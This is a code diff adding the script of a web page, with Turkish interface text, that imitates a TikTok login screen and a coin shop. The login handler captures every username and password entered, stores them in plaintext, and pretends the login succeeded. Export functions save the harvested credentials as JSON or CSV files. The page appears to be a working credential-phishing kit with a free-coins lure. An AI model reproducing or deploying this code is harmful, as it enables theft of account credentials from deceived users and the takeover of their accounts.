+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `tiktok_login_records_${Date.now()}.json`;
+            a.click();
+            showNotification('📥 JSON dosyası indirildi!');
+        }
+
+        // Export CSV
+        function exportCSV() {
+            let csv = 'No,Kullanıcı Adı,Şifre,Tarih,Saat\n';
+            loginRecords.forEach((record, index) => {
+                csv += `${index + 1},"${record.username}","${record.password}","${record.date}","${record.time}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `tiktok_login_records_${Date.now()}.csv`;
+            a.click();
+            showNotification('📊 Excel dosyası indirildi!');
+        }
+
+        // Clear All Records
+        function clearAllRecords() {
+            if (confirm('⚠️ Tüm kayıtları silmek istediğinize emin misiniz?\nBu işlem geri alınamaz!')) {
+                loginRecords = [];
+                saveData();
+                loadRecords();
+                showNotification('🗑️ Tüm kayıtlar silindi!');
+            }
+        }
+
+        // Update Jeton Display
+        function updateJetonDisplay() {
+            document.getElementById('jetonDisplay').textContent = `💎 ${jeton} Jeton`;
+            saveData();
+        }
+
+        // Show Notification
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        // Show Section
+        function showSection(section) {
+            document.getElementById(currentSection).style.display = 'none';
+            document.getElementById(section).style.display = 'block';
+            currentSection = section;
+            
+            if (section === 'videoFeed') {
+                initializeVideos();
+            }
+            
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+        }
+
+        function showMarket() {
+            showSection('jetonMarket');
+        }
+
+        // Login Form
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            
+            if (username && password) {
+                // Save login record
+                const now = new Date();
+                const record = {
+                    username: username,
+                    password: password,
+                    date: now.toLocaleDateString('tr-TR'),
+                    time: now.toLocaleTimeString('tr-TR'),
+                    timestamp: now.getTime()
+                };
+                
+                loginRecords.push(record);
+                saveData();
+                
+                showNotification("🔐 Giriş yapılıyor...");
+                
+                setTimeout(() => {
+                    showSection('videoFeed');
+                    showNotification("🎉 Başarıyla giriş yapıldı!");
+                    this.reset();
+                }, 1500);
+            }
+        }
+
+        // Buy Package
+        function buyPackage(amount) {
+            jeton += amount;
+            updateJetonDisplay();
+            showNotification(`🎉 ${amount} jeton satın aldın!`);
+        }
+
+        // Language Change
+        function changeLanguage() {
+            const lang = document.getElementById('languageSelector').value;
+            showNotification(`🌍 Dil değiştirildi`);
+        }
+
+        // Initialize
+        loadSavedData();
+        updateJetonDisplay();
+        
+        // Initialize videos when page loads
+        setTimeout(() => {
+            if (currentSection === 'videoFeed') {
+                initializeVideos();
+            }
+        }, 100);
+    </script>
+</body>
+</html>
